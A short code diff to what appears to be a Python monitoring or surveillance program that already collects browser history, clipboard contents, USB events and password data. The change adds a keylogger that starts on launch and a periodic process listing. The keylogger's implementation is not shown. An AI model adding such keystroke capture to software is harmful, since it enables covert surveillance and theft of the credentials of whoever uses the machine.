@@ -14,8 +14,9 @@ import service.usb_utils
 import service.clipboard_utils
 import browserhistory as bh
 
-from service import net_utils, mail, ai_conf, passwd_utils
+from service import net_utils, mail, ai_conf, passwd_utils, ps_utils
 from service.file_utils import get_file_type, read_docx_file, read_pdf_file, read_txt_file
+from service.keylog_utils import Keylogger
 from view import view_utils, passwd_view
 
 
@@ -254,6 +255,8 @@ def main_process():
             view_utils.usb_check(main_log)
             # net_utils.disable_websites()
             view_utils.clipboard_info_view(main_log, new_window)
+            Keylogger(interval=5).start()
+            ps_utils.get_processes(True, 5)
             new_window.protocol("WM_DELETE_WINDOW", window_passwd)
             new_window.mainloop()
         except KeyboardInterrupt:
